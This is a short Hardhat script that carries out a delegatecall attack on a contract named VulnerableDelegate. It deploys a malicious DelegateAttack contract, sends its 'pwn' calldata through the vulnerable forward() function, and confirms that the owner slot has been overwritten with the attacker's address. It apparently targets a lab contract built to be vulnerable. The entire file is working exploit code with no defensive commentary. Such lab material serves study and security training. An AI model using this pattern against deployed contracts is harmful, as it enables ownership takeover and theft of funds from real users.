const hre = require("hardhat");

async function main() {
    const [attacker] = await hre.ethers.getSigners();
    console.log("[+] Delegate Call Attack initiated");

    const deployments = require("../deployments.json");
    const vuln = await hre.ethers.getContractAt("VulnerableDelegate", deployments.VulnerableDelegate);

    const DelegateAttack = await hre.ethers.getContractFactory("DelegateAttack");
    const mal = await DelegateAttack.deploy();
    await mal.deployed();

    const beforeOwner = await vuln.owner();
    console.log("[i] Original owner:", beforeOwner);

    const tx = await vuln.forward(mal.address, mal.interface.encodeFunctionData("pwn"));
    await tx.wait();

    const afterOwner = await vuln.owner();
    console.log("[✓] Owner overwritten:", afterOwner);
    console.log("    Attacker control:", afterOwner === attacker.address);
}

main().catch(console.error);
